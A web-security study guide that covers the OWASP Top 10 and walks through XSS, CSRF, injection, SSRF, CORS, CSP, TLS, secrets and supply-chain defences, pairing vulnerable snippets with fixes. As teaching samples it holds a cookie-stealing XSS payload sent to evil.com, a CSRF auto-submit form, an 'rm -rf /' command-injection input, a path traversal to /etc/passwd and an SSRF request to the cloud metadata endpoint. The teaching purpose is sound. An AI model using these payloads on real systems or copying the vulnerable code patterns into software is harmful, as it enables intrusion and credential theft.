# 🛡️ 02 — Web Security

> *"The attacker only has to be right once. You have to be right every time. Security is not a feature you add — it's a discipline you practice on every line."*

**Prev:** [`01-Authentication-And-Authorization.md`](./01-Authentication-And-Authorization.md) · **Next:** [`03-Testing-Strategies.md`](./03-Testing-Strategies.md) · **Index:** [`00-Index.md`](./00-Index.md)

---

## I. THE MINDSET: NEVER TRUST INPUT

Every security failure reduces to one root cause: **trusting something you shouldn't.** Trusting user input, trusting a request's origin, trusting a third-party package, trusting that the network is private. The professional's default posture is **zero trust on data crossing a boundary**:

```
Untrusted ──▶ [ validate ] ──▶ [ sanitize/encode ] ──▶ trusted use
   input         reject bad        neutralize meaning      (DB, HTML, shell)
```

Two distinct defenses you'll see repeatedly:

- **Input validation** — reject data that doesn't fit the expected shape (an email must look like an email). A *whitelist* ("allow only these") beats a *blacklist* ("block these bad ones") every time.
- **Output encoding / parameterization** — when data crosses into a new context (HTML, SQL, a shell), neutralize its special meaning so it's treated as *data*, never as *code*.

> **The golden principle of injection.** Almost every injection bug (XSS, SQLi, command injection) is the same mistake: **data got interpreted as code.** The universal fix is to keep code and data in separate channels — parameterized queries, encoded output, argument arrays.

---

## II. OWASP TOP 10 (2021) — THE MAP

The [OWASP Top 10](https://owasp.org/www-project-top-ten/) is the industry's consensus list of the most critical web risks. Memorize the categories; they're the checklist every review runs against.

| # | Category | One-line meaning | Covered in |
|---|----------|------------------|-----------|
| A01 | **Broken Access Control** | Users do things they shouldn't (IDOR, missing checks) | §file 01 + §IDOR |
| A02 | **Cryptographic Failures** | Weak/missing crypto; secrets in transit/at rest | §VIII, §X |
| A03 | **Injection** | Untrusted input runs as code (SQLi, XSS, cmd) | §III–V |
| A04 | **Insecure Design** | Flawed by architecture, not just by bug | whole file |
| A05 | **Security Misconfiguration** | Defaults, verbose errors, open buckets | §VII, §IX |
| A06 | **Vulnerable & Outdated Components** | Old libraries with known CVEs | §XII |
| A07 | **Identification & Auth Failures** | Weak login, sessions, tokens | file 01 |
| A08 | **Software & Data Integrity Failures** | Unverified updates, insecure deserialization, CI/CD | §XII |
| A09 | **Security Logging & Monitoring Failures** | You can't see the attack | file 08 |
| A10 | **Server-Side Request Forgery (SSRF)** | Server tricked into making requests | §VI |

This file walks the high-frequency, hands-on categories. Auth failures (A07) live in [file 01](./01-Authentication-And-Authorization.md); logging gaps (A09) in [file 08](./08-API-Design-And-Observability.md).

---

## III. XSS — CROSS-SITE SCRIPTING

XSS happens when an attacker injects JavaScript that runs in **another user's browser**, in *your site's* origin — so it can read cookies, the DOM, keystrokes, and act as the victim.

**Three types:**

| Type | Where the payload lives | Example |
|------|------------------------|---------|
| **Stored** | Saved in your DB, served to many users | Malicious comment shown to every reader |
| **Reflected** | Bounced off a request (URL/param) into the response | `?q=<script>...</script>` echoed in results page |
| **DOM-based** | Client-side JS writes untrusted data into the DOM | `el.innerHTML = location.hash` |

```js
// ❌ STORED XSS — rendering user content as raw HTML
app.get("/comments", async (req, res) => {
  const rows = await db.comments.all();
  // If a comment is "<script>fetch('//evil.com?c='+document.cookie)</script>"
  // it executes in every visitor's browser.
  res.send(rows.map(r => `<div>${r.body}</div>`).join(""));
});
```

**Defenses (layer them):**

```js
// 1) OUTPUT ENCODING — the primary fix. Encode data for the context it lands in.
function escapeHtml(s) {
  return s.replace(/[&<>"']/g, c =>
    ({ "&": "&amp;", "<": "&lt;", ">": "&gt;", '"': "&quot;", "'": "&#39;" }[c]));
}
res.send(rows.map(r => `<div>${escapeHtml(r.body)}</div>`).join(""));

// 2) Frameworks encode by default — React's {value} auto-escapes. The danger is opt-OUT:
//    <div dangerouslySetInnerHTML={{ __html: userInput }} />   ← only with sanitized HTML

// 3) SANITIZE rich HTML you must allow (e.g. a WYSIWYG editor) with a vetted library
const createDOMPurify = require("dompurify");
const { JSDOM } = require("jsdom");
const DOMPurify = createDOMPurify(new JSDOM("").window);
const safe = DOMPurify.sanitize(userHtml);   // strips <script>, onerror=, javascript: etc.
```

> **⚠️ Gotcha — `innerHTML`, `dangerouslySetInnerHTML`, `eval`, and `v-html` are XSS gateways.** Treat any API that turns a string into live markup/code as guilty until proven sanitized. Prefer `textContent`, framework interpolation, and explicit sanitization.

The strongest backstop is a **Content Security Policy** (§VII) — even if a payload slips through, CSP can stop it from executing.

---

## IV. CSRF — CROSS-SITE REQUEST FORGERY

CSRF abuses the browser's habit of **automatically attaching cookies** to requests. If you're logged into `bank.com` and visit `evil.com`, a hidden form there can POST to `bank.com/transfer` — and your auth cookie rides along, so the bank thinks *you* did it.

```html
<!-- On evil.com — auto-submits to your bank using YOUR cookie -->
<form action="https://bank.com/transfer" method="POST" id="f">
  <input name="to" value="attacker"><input name="amount" value="10000">
</form>
<script>document.getElementById("f").submit();</script>
```

**Three defenses (use SameSite + tokens together):**

```js
// 1) SAMESITE COOKIES — the first line. Cross-site requests don't carry the cookie.
res.cookie("sid", id, { httpOnly: true, secure: true, sameSite: "lax" });
//    Lax: blocks cross-site POST; allows top-level GET navigation. Good default.
//    Strict: blocks everything cross-site (can break "click link from email" flows).

// 2) SYNCHRONIZER TOKEN — server issues a random token, embeds it in the form,
//    and verifies it on submit. evil.com can't read it (same-origin policy).
const csrf = require("csurf");
app.use(csrf({ cookie: true }));
app.get("/form", (req, res) => res.send(`<input name="_csrf" value="${req.csrfToken()}">`));
//    POST without the matching token → 403.

// 3) DOUBLE-SUBMIT COOKIE — set a random value in a cookie AND require it echoed
//    in a header/body. JS on your origin can read the cookie; cross-site JS cannot.
```

| Defense | How it works | Note |
|---------|--------------|------|
| `SameSite=Lax/Strict` | Browser withholds cookie cross-site | Easiest; near-complete for modern browsers |
| Synchronizer token | Server-stored token in form, verified | Classic, robust, needs server state |
| Double-submit cookie | Token in cookie + header must match | Stateless variant |

> **Gotcha — CSRF only matters for cookie-based auth.** If you authenticate with a `Bearer` token in the `Authorization` header (attached by *your* JS, not auto-sent by the browser), CSRF largely doesn't apply — but then you've taken on XSS/token-storage risk instead (file 01). Pick your tradeoff deliberately.

---

## V. INJECTION — SQL, NoSQL, COMMAND, PATH

### SQL injection

```js
// ❌ VULNERABLE — string concatenation. Input "x' OR '1'='1" dumps the table.
const q = `SELECT * FROM users WHERE email = '${req.body.email}'`;
db.query(q);

// ✅ PARAMETERIZED — the driver sends query and data separately; data is never parsed as SQL.
db.query("SELECT * FROM users WHERE email = $1", [req.body.email]);   // node-postgres
db.query("SELECT * FROM users WHERE email = ?", [req.body.email]);    // mysql2
```

### NoSQL injection

```js
// ❌ VULNERABLE — MongoDB operator injection. If req.body.password is { "$ne": null },
//    the query matches ANY password.
db.users.findOne({ email: req.body.email, password: req.body.password });

// ✅ Coerce to expected types + validate; never pass raw request objects as query values.
const email = String(req.body.email);
const password = String(req.body.password);
// (and verify a HASH, not the raw password — see file 01)
```

### Command injection & path traversal

```js
// ❌ COMMAND INJECTION — input "; rm -rf /" becomes a second shell command.
const { exec } = require("child_process");
exec(`convert ${req.query.file} out.png`);

// ✅ Use the array form (no shell) — arguments can't break out into new commands.
const { execFile } = require("child_process");
execFile("convert", [req.query.file, "out.png"]);

// ❌ PATH TRAVERSAL — "../../etc/passwd" escapes your directory.
res.sendFile("/var/data/" + req.params.name);

// ✅ Resolve and confirm the path stays inside the allowed root.
const path = require("path");
const root = "/var/data";
const target = path.resolve(root, req.params.name);
if (!target.startsWith(root + path.sep)) return res.status(400).end();
res.sendFile(target);
```

> **The single rule for all injection:** separate code from data. Parameterize queries, use argument arrays (never shell strings), validate/normalize file paths, and type-coerce inputs. Concatenating untrusted input into an interpreter is *always* the bug.

---

## VI. SSRF — SERVER-SIDE REQUEST FORGERY (A10)

SSRF tricks **your server** into making a request the attacker chooses. The danger: your server sits *inside* the network, so it can reach internal services, admin panels, and — famously — the **cloud metadata endpoint** (`169.254.169.254`) that hands out credentials.

```js
// ❌ VULNERABLE — fetching an attacker-controlled URL
app.get("/fetch", async (req, res) => {
  const data = await fetch(req.query.url);   // url = http://169.254.169.254/latest/meta-data/...
  res.send(await data.text());               // → leaks cloud IAM credentials
});

// ✅ Allowlist hosts, block private/link-local ranges, disable redirects, set timeouts.
const { URL } = require("url");
const ALLOWED = new Set(["images.example.com", "cdn.example.com"]);
app.get("/fetch", async (req, res) => {
  let u;
  try { u = new URL(req.query.url); } catch { return res.status(400).end(); }
  if (u.protocol !== "https:" || !ALLOWED.has(u.hostname)) return res.status(400).end();
  const data = await fetch(u, { redirect: "error", signal: AbortSignal.timeout(3000) });
  res.send(await data.text());
});
```

> **⚠️ Gotcha — allowlist by host, and resolve DNS too.** Attackers use redirects, DNS rebinding, and decimal/hex IP encodings to bypass naive checks. Block the link-local (`169.254.0.0/16`), loopback, and private (`10/8`, `172.16/12`, `192.168/16`) ranges, and disallow following redirects to them.

---

## VII. CORS — CROSS-ORIGIN RESOURCE SHARING

CORS is widely misunderstood. It is **not** a server-protection mechanism — it's a browser policy that *relaxes* the **Same-Origin Policy** to let your frontend on one origin call your API on another. An **origin** is `scheme + host + port`; differ in any one and it's cross-origin.

```
https://app.com   vs   https://api.app.com   →  cross-origin (different host)
https://app.com   vs   http://app.com        →  cross-origin (different scheme)
https://app.com   vs   https://app.com:8080   →  cross-origin (different port)
```

For "non-simple" requests (custom headers, `PUT`/`DELETE`, JSON content type), the browser first sends a **preflight** `OPTIONS` asking permission:

```
Browser → OPTIONS /data            Server → Access-Control-Allow-Origin: https://app.com
          Origin: https://app.com           Access-Control-Allow-Methods: GET, POST
          Access-Control-Request-Method: POST  Access-Control-Allow-Headers: Content-Type
```

```js
const cors = require("cors");

// ✅ Explicit allowlist + credentials handled correctly
app.use(cors({
  origin: ["https://app.com", "https://admin.app.com"],   // exact origins, NOT "*"
  credentials: true,                                       // allow cookies cross-origin
  methods: ["GET", "POST", "PUT", "DELETE"],
  allowedHeaders: ["Content-Type", "Authorization"],
}));
```

> **⚠️ Gotcha — `Access-Control-Allow-Origin: *` with `credentials: true` is forbidden by browsers and dangerous.** You cannot use the wildcard while sending cookies. Reflecting *any* `Origin` back (`origin: true`) effectively disables the protection — always use an explicit allowlist.

> **Gotcha — CORS doesn't protect your API.** It only governs *browser* JavaScript. `curl`, servers, and scripts ignore it entirely. Real protection is authentication + authorization on the server. CORS just decides which browser origins may *read* responses.

---

## VIII. CONTENT SECURITY POLICY (CSP)

CSP is a response header that tells the browser **which sources are allowed** to load scripts, styles, images, etc. It's the most powerful XSS *mitigation*: even if a payload is injected, CSP can refuse to execute it.

```
Content-Security-Policy:
  default-src 'self';
  script-src 'self' 'nonce-r4nd0m';        ← only your origin + scripts with this nonce
  style-src 'self';
  img-src 'self' data: https://cdn.example.com;
  object-src 'none';                         ← kill Flash/plugins
  base-uri 'self';
  frame-ancestors 'none';                    ← clickjacking defense (can't be framed)
  report-uri /csp-report
```

```js
// Per-request nonce: inline scripts must carry the matching nonce to run.
const crypto = require("crypto");
app.use((req, res, next) => {
  res.locals.nonce = crypto.randomBytes(16).toString("base64");
  res.setHeader("Content-Security-Policy",
    `default-src 'self'; script-src 'self' 'nonce-${res.locals.nonce}'; object-src 'none'`);
  next();
});
// In your template:  <script nonce="<%= nonce %>"> ... </script>
```

| Concept | Purpose |
|---------|---------|
| `'self'` | Same-origin only |
| `'nonce-xyz'` | Allow specific inline scripts tagged with this random nonce |
| `'unsafe-inline'` | Allow ALL inline scripts — **defeats CSP's XSS protection**, avoid |
| `Content-Security-Policy-Report-Only` | Log violations without blocking — roll out safely |

> **Gotcha — roll CSP out in `Report-Only` mode first.** A strict policy will break legitimate inline scripts and third-party widgets. Deploy report-only, collect violation reports, fix the gaps, *then* enforce.

---

## IX. HTTPS / TLS AND SECURITY HEADERS

**TLS** encrypts traffic, authenticates the server (via certificates), and guarantees integrity. Without it, anyone on the network reads passwords and steals cookies in plaintext.

The handshake, simplified:

```
1. Client Hello   → supported ciphers, TLS version
2. Server Hello   → chosen cipher + certificate (signed by a trusted CA)
3. Client verifies the cert chain (is this really api.app.com? signed by a CA I trust?)
4. Key exchange   → both derive a shared session key (ECDHE = forward secrecy)
5. Encrypted application data flows under that session key
```

```js
// HSTS — tell browsers to ONLY ever use HTTPS for this domain (stops downgrade/SSL-strip)
app.use((req, res, next) => {
  res.setHeader("Strict-Transport-Security", "max-age=31536000; includeSubDomains; preload");
  next();
});

// Redirect all HTTP to HTTPS (behind a proxy, check x-forwarded-proto)
app.use((req, res, next) =>
  req.secure || req.get("x-forwarded-proto") === "https"
    ? next()
    : res.redirect(301, "https://" + req.headers.host + req.url));
```

**`helmet` sets a battery of protective headers in one line:**

```js
const helmet = require("helmet");
app.use(helmet());   // sets the headers below with sane defaults
```

| Header | Protects against |
|--------|------------------|
| `Strict-Transport-Security` | Protocol downgrade / SSL stripping |
| `X-Content-Type-Options: nosniff` | MIME-sniffing (treating an image as a script) |
| `X-Frame-Options: DENY` | Clickjacking (your page framed by an attacker) |
| `Content-Security-Policy` | XSS, data injection |
| `Referrer-Policy` | Leaking URLs (and tokens in them) to other sites |
| `Permissions-Policy` | Restricts camera, mic, geolocation APIs |

> **Gotcha — `helmet()` does NOT enable a strict CSP by default.** Its default CSP is conservative and you'll usually need to configure `contentSecurityPolicy` for your app's real sources. Don't assume `helmet()` alone gives you XSS protection.

---

## X. SECRETS MANAGEMENT

Secrets are API keys, DB passwords, signing keys, tokens. The cardinal sins are **committing them to git** and **logging them**.

```bash
# .env — local only, NEVER committed
DATABASE_URL=postgres://user:pass@host/db
JWT_SECRET=long-random-value
STRIPE_KEY=sk_live_...
```

```bash
# .gitignore — keep secrets out of history
.env
.env.local
*.pem
```

```js
// Load from environment; fail fast if a required secret is missing.
const required = ["DATABASE_URL", "JWT_SECRET"];
for (const k of required) if (!process.env[k]) throw new Error(`Missing env var: ${k}`);
```

| Practice | Why |
|----------|-----|
| Secrets in env vars / vault, not code | Code is shared, logged, and leaked |
| Never commit `.env` | Git history is forever; rotate immediately if you do |
| Use a manager (Vault, AWS Secrets Manager, Doppler) | Central rotation, access control, audit |
| **Rotate** regularly & on suspicion | Limits the blast radius of a leak |
| Different secrets per environment | A staging leak shouldn't touch prod |
| Scan repos (`gitleaks`, `trufflehog`) | Catch accidental commits in CI |

> **⚠️ Gotcha — if a secret ever hits git, rotating is the ONLY fix.** Deleting the file in a later commit does nothing — it's still in history, and bots scrape public repos within seconds. Assume it's compromised and rotate the credential.

---

## XI. RATE LIMITING & BRUTE-FORCE DEFENSE

Without limits, attackers brute-force passwords, stuff stolen credentials, scrape data, and exhaust resources (DoS). Rate limiting caps how often a client may act.

```js
const rateLimit = require("express-rate-limit");

// General API limit
app.use("/api", rateLimit({ windowMs: 60_000, max: 100, standardHeaders: true }));

// Stricter on auth — and key by username+IP so one attacker can't lock out everyone
app.use("/login", rateLimit({
  windowMs: 15 * 60_000,
  max: 5,                                   // 5 attempts per window
  keyGenerator: (req) => `${req.ip}:${req.body?.email}`,
  handler: (req, res) => res.status(429).json({ error: "Too many attempts, try later" }),
}));
```

| Technique | Purpose |
|-----------|---------|
| Rate limiting per IP/user | Throttle brute force & scraping |
| Account lockout / exponential backoff | Slow repeated failed logins |
| CAPTCHA after N failures | Block automated attempts |
| MFA (file 01) | Password alone is no longer enough |
| Generic error + constant timing | Defeat user enumeration |

> **Gotcha — lock the attacker, not the victim.** Locking an account purely by username lets an attacker lock out any user on demand (a DoS). Key limits on IP + identifier, prefer exponential backoff and CAPTCHA, and pair with MFA. (Rate-limit algorithms — token/leaky bucket, windows — are detailed in [file 08](./08-API-Design-And-Observability.md).)

---

## XII. DEPENDENCY & SUPPLY-CHAIN SECURITY

Modern apps are mostly *other people's code*. A single vulnerable transitive dependency (A06) or a poisoned package (A08) compromises everything.

```bash
npm audit                      # list known CVEs in your dependency tree
npm audit fix                  # auto-upgrade where a safe fix exists
npm audit --production         # ignore devDependencies for what ships

npm ci                         # install EXACTLY from the lockfile (reproducible builds)
```

| Practice | Why |
|----------|-----|
| Commit the **lockfile** (`package-lock.json`) | Pin exact versions → reproducible, no surprise upgrades |
| `npm ci` in CI (not `npm install`) | Installs precisely what was tested |
| **SCA** tools (Dependabot, Snyk) | Automated CVE alerts + upgrade PRs |
| Pin/scrutinize versions | Defends against malicious releases |
| Watch for **typosquatting** | `expreess`, `crossenv` — fake packages mimic real names |
| Minimize dependencies | Every package is attack surface + trust |
| Verify integrity (`npm` hashes, SLSA) | Detect tampered artifacts |

> **⚠️ Gotcha — supply-chain attacks are real and rising.** `event-stream`, `node-ipc`, and `xz` showed that a trusted package can turn malicious via a compromised maintainer or a new release. Pin versions, review dependency updates, and never blindly `npm install <unfamiliar-package>` — check downloads, repo, and maintainers first.

---

## XIII. A LAYERED CHECKLIST (DEFENSE IN DEPTH)

No single control is enough; security is *layers*, so one failure isn't catastrophic.

```
Network    → HTTPS/TLS everywhere, HSTS, firewall, private subnets
Edge       → WAF, rate limiting, DDoS protection, CDN
App        → input validation, output encoding, parameterized queries, CSP
Auth       → strong hashing, MFA, short tokens, least privilege (file 01)
Data       → encryption at rest, secrets in a vault, minimal PII
Deps       → audit, lockfiles, SCA, pinned versions
Observe    → logging, alerting on anomalies, incident response (file 08)
```

---

## XIV. COMMON PITFALLS

| Pitfall | Risk | Fix |
|---------|------|-----|
| Rendering user input as raw HTML | Stored/reflected XSS | Output-encode; sanitize rich HTML; CSP |
| `innerHTML` / `dangerouslySetInnerHTML` | DOM XSS | `textContent`; sanitize; framework interpolation |
| String-concatenated SQL | SQL injection | Parameterized queries |
| Passing raw request objects to Mongo | NoSQL injection | Type-coerce + validate inputs |
| `exec()` with user input | Command injection | `execFile`/array args (no shell) |
| Fetching user-supplied URLs | SSRF → credential theft | Allowlist hosts; block private ranges; no redirects |
| `Allow-Origin: *` + credentials | CORS bypass / data exposure | Explicit origin allowlist |
| Thinking CORS protects the API | False sense of security | Authn/authz on the server |
| `'unsafe-inline'` in CSP | XSS not mitigated | Use nonces/hashes |
| HTTP (no TLS) | Sniffing, MITM | HTTPS + HSTS + redirect |
| Secrets committed to git | Permanent credential leak | `.gitignore`, vault, rotate if leaked |
| No login rate limit | Brute force / credential stuffing | Rate limit + lockout + MFA |
| Account lockout by username only | DoS on victims | Key on IP+user; backoff; CAPTCHA |
| Ignoring `npm audit` | Known CVEs in production | Audit + SCA + lockfile + `npm ci` |
| Verbose error messages / stack traces | Info leakage | Generic errors to clients; log details server-side |

---

## 🧠 KEY TAKEAWAYS

- **Never trust input.** Validate (whitelist) on the way in, encode/parameterize on the way out. Almost every injection bug is *data interpreted as code*.
- **XSS** runs attacker JS in your origin — defend with **output encoding**, sanitization of rich HTML, and a strict **CSP** as backstop. Avoid `innerHTML`-style sinks.
- **CSRF** abuses auto-sent cookies — defend with `SameSite` cookies *plus* synchronizer/double-submit tokens. It only applies to cookie auth.
- **Injection** (SQL/NoSQL/command/path) is killed by separating code from data: parameterized queries, argument arrays, path normalization, type coercion.
- **SSRF** turns your server into the attacker's proxy — allowlist hosts and block internal/metadata ranges.
- **CORS relaxes, it doesn't protect.** It governs browser reads only; real protection is server-side authn/authz. Never pair `*` with credentials.
- **TLS everywhere** with HSTS; let **helmet** set protective headers, but configure CSP yourself.
- **Secrets** belong in env/vaults, never in git — and once leaked, **rotate**, because history is forever.
- **Rate-limit** auth endpoints and add MFA to stop brute force; lock the attacker, not the victim.
- **Your dependencies are your attack surface** — audit, pin via lockfiles, use SCA, and beware typosquatting and supply-chain compromise.

---

**Prev:** [`01-Authentication-And-Authorization.md`](./01-Authentication-And-Authorization.md) · **Next:** [`03-Testing-Strategies.md`](./03-Testing-Strategies.md) · **Index:** [`00-Index.md`](./00-Index.md)
